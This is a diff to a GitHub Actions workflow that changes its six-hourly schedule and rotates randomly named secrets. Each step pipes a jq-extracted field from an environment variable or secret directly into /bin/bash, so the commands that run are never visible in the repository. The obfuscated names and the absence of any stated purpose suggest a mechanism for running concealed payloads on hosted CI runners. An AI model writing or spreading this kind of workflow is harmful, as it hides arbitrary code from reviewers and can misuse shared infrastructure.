@@ -1,9 +1,9 @@
 name: unfoldedsavory
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 2/6 * * *'
-
+    - cron: '41 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +12,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: unfoldedsavory
         env:
-          wpqr6326: ${{ secrets.wpqr6326 }}
+          tnyzr434: ${{ secrets.tnyzr434 }}
         run: |
-          echo $wpqr6326 | jq -r .bfjy1 | /bin/bash
-          echo $q71 | jq -r .tccz1 | /bin/bash
-          echo $xxdw55536 | jq -r .iyi9 | /bin/bash
-          echo $bmxg675 | jq -r .tc7 | /bin/bash
-          echo $vv729 | jq -r .qwd880 | /bin/bash
-          echo $veyy5153 | jq -r .cx8911 | /bin/bash
+          echo $tnyzr434 | jq -r .yhszl33 | /bin/bash
+          echo $ku12 | jq -r .ieox13196 | /bin/bash
 
